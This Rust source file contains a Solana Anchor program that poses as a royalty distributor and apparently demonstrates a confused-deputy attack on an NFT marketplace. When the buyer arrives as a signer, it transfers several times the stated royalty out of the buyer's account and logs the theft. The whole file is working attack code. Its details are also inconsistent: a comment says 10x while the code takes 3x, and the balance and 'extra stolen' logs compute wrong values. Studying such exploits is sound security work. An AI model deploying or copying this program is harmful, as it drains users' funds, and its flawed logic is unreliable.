use anchor_lang::prelude::*;
use anchor_lang::solana_program::system_instruction;
use std::str::FromStr;

declare_id!("AuP6y1UXaxHqSu5p3X6vN8yYUgPTQ9xPmSKgub4Eodgp");

#[derive(Accounts)]
pub struct DistributeRoyalties<'info> {
    /// The buyer account - should be a signer due to confused deputy vulnerability
    /// CHECK: In a real attack, this would be validated to ensure it's the victim
    #[account(mut)]
    pub buyer: AccountInfo<'info>,

    /// The escrow account from the marketplace
    /// CHECK: This might have PDA signer privileges from the marketplace program
    #[account(mut)]
    pub escrow: AccountInfo<'info>,

    /// The seller account (not important for the attack)
    /// CHECK: Just passed through from marketplace
    pub seller: AccountInfo<'info>,

    /// The listing account (not important for the attack)
    /// CHECK: Just passed through from marketplace
    pub listing: AccountInfo<'info>,

    /// System program for transferring SOL
    pub system_program: Program<'info, System>,
}

/// 🚨 MALICIOUS ROYALTY PROGRAM 🚨
///
/// This program pretends to be a legitimate royalty distributor but is actually malicious.
/// It demonstrates what an attacker could do when receiving signer privileges through
/// the confused deputy vulnerability in the NFT marketplace.

#[program]
pub mod fake_royalty_program {
    use super::*;

    /// This function pretends to distribute royalties but actually steals extra funds
    pub fn distribute_royalties(
        ctx: Context<DistributeRoyalties>,
        royalty_amount: u64,
    ) -> Result<()> {
        msg!("[FAKE ROYALTY PROGRAM] Processing royalty distribution...");

        // Get account info
        let buyer = &ctx.accounts.buyer;
        let escrow = &ctx.accounts.escrow;
        let system_program = &ctx.accounts.system_program;

        // Check if buyer is a signer (this should be true due to confused deputy)
        if buyer.is_signer {
            msg!("[FAKE ROYALTY PROGRAM] ✅ Buyer authorization confirmed");

            // Get buyer's current balance
            let buyer_balance = buyer.lamports();
            msg!(
                "[FAKE ROYALTY PROGRAM] Buyer balance: {} SOL",
                buyer_balance as f64 / 1_000_000_000.0
            );
            msg!(
                "[FAKE ROYALTY PROGRAM] Expected royalty amount: {} SOL",
                royalty_amount as f64 / 1_000_000_000.0
            );

            // 🚨 MALICIOUS LOGIC: Steal 10x the royalty amount! 🚨
            let actual_amount_to_take = royalty_amount * 3;

            msg!(
                "[FAKE ROYALTY PROGRAM] 🚨 STEALING EXTRA! Taking {} SOL instead of {}",
                actual_amount_to_take as f64 / 1_000_000_000.0,
                royalty_amount as f64 / 1_000_000_000.0
            );

            // Ensure we don't take more than available (minus rent)
            let max_available = buyer_balance.saturating_sub(1_000_000);
            let amount_to_transfer = std::cmp::min(actual_amount_to_take, max_available);

            if amount_to_transfer > 0 {
                msg!(
                    "[FAKE ROYALTY PROGRAM] Transferring {} SOL from buyer to escrow",
                    amount_to_transfer as f64 / 1_000_000_000.0
                );
                msg!(
                    "[FAKE ROYALTY PROGRAM] (Buyer thinks they're paying {} SOL for royalties)",
                    royalty_amount as f64 / 1_000_000_000.0
                );

                // Create transfer instruction - looks legitimate but steals extra
                let transfer_instruction =
                    system_instruction::transfer(buyer.key, escrow.key, amount_to_transfer);

                // Execute the transfer using invoke
                anchor_lang::solana_program::program::invoke(
                    &transfer_instruction,
                    &[
                        buyer.clone(),
                        escrow.clone(),
                        system_program.to_account_info(),
                    ],
                )?;

                msg!("[FAKE ROYALTY PROGRAM] 💰 THEFT SUCCESSFUL!");
                msg!(
                    "[FAKE ROYALTY PROGRAM] Expected payment: {} SOL",
                    royalty_amount as f64 / 1_000_000_000.0
                );
                msg!(
                    "[FAKE ROYALTY PROGRAM] Actually stolen: {} SOL",
                    amount_to_transfer as f64 / 1_000_000_000.0
                );
                msg!(
                    "[FAKE ROYALTY PROGRAM] Extra stolen: {} SOL",
                    (amount_to_transfer - royalty_amount) as f64 / 1_000_000_000.0
                );
                msg!(
                    "[FAKE ROYALTY PROGRAM] Buyer balance now: {} SOL",
                    (buyer.lamports() - amount_to_transfer) as f64 / 1_000_000_000.0
                );
            } else {
                msg!("[FAKE ROYALTY PROGRAM] Insufficient buyer balance for theft");
            }
        } else {
            msg!("[FAKE ROYALTY PROGRAM] ❌ Buyer is not a signer (attack failed)");
        }

        Ok(())
    }
}
